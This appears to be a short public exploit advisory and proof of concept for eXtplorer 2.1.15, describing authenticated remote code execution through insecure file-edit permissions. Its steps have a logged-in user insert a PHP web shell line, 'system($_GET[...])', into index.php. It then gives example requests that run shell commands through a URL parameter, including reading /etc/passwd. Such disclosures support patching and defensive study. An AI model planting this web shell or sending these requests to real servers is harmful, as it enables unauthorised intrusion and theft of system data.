Title: eXtplorer 2.1.15 – Insecure Permissions following Remote Code Execution (Authenticated)<br>
Date: 2022-11-09<br>
Author: Francisco Marinho<br>
Vendor Homepage: http://extplorer.net/<br>
Software Link: http://extplorer.net/attachments/download/99/eXtplorer_2.1.15.zip<br>
Version: 2.1.15<br>
Tested on: Linux<br>
==========> POC <==========<br>
<br>
1- Login with your account<br>
2- Access the directory /index.php<br>
3- Edit index.php, adding “system($_GET[‘tristao’]);” on line two.<br>
4- Acess homepage index.php<br>
Examples:<br>
cat /etc/passwd<br>
/index.php?tristao=cat%20%20/etc/passwd<br>
cat ls -la<br>
/index.php?tristao=ls%20-la<br>
